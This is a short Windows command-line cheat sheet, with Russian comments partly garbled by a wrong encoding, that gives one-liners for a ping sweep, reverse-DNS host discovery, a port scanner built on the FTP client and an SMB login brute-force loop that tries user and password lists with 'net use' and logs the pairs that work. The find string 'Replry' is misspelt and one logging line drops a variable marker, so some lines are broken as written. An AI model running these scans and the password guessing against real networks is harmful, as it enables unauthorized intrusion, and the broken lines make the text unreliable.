rem Command1 & Command2 - запуск нескольких команд
rem Command1 && Command2 - запуск второй, только при успешном выполнении первой

rem ѕоиск живых хостов
for /L %i in (1,1,254) do @ping 10.10.10.%i -n 1 | find "Replry"

rem ќпредел€ем имена хостов
for /L %i in (1,1,254) do @nslookup 10.10.10.%i 2 > nul | find "Name" && echo 10.10.10.%i

rem ѕорт сканер на базе ftp-клиента
for /L %i in (1,1,1024) do echo Checking Port %i: >> ports.txt & echo open 192.168.0.1 %i > ftp.txt & echo quit >> ftp.txt & ftp.exe -s:ftp.txt 2>>ports.txt

rem ѕеребираем лигины и пароли из файла на доступ к удаленному хосту по SMB
for /f %i in (user.txt) do @(for /f %j in (pass.txt) do @echo %i:%j & @net use \\10.10.10.10 %j /u:%i 2>nul && echo %i:j >>success.txt && net use \\10.10.10.10 /del)